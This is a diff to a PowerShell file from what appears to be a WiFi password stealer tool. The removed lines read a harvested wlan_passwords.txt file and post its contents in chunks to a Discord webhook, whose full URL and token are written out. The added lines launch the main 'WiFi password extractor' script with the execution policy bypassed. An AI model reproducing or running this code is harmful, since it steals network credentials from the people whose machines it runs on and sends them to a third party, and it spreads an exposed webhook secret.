@@ -1,28 +1,11 @@
-# Variables
-$FileToFind = "$env:USERPROFILE\Downloads\wlan_passwords.txt"
-$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
+# Local Runner for SQD5-DCWH
+# This script runs the local version of the WiFi password extractor
 
-# Check if file exists
-if (-Not (Test-Path $FileToFind)) {
-    Write-Host "File not found: $FileToFind"
-    exit
+$ScriptPath = Join-Path $PSScriptRoot "sqd5dcwh.ps1"
+
+if (Test-Path $ScriptPath) {
+    Write-Host "[*] Starting local execution..." -ForegroundColor Cyan
+    powershell.exe -NoProfile -ExecutionPolicy Bypass -File $ScriptPath
+} else {
+    Write-Error "Main script not found at $ScriptPath"
 }
-
-Write-Host "File found: $FileToFind"
-
-# Read file and filter lines
-$FilteredLines = Get-Content $FileToFind | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
-
-# Join filtered lines
-$FilteredContent = $FilteredLines -join "`n"
-
-# Discord max message length
-$MaxLength = 2000
-
-# Split into chunks of max 2000 characters
-for ($i = 0; $i -lt $FilteredContent.Length; $i += $MaxLength) {
-    $Chunk = $FilteredContent.Substring($i, [Math]::Min($MaxLength, $FilteredContent.Length - $i))
-    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body @{ content = $Chunk }
-}
-
-Write-Host "Success!"
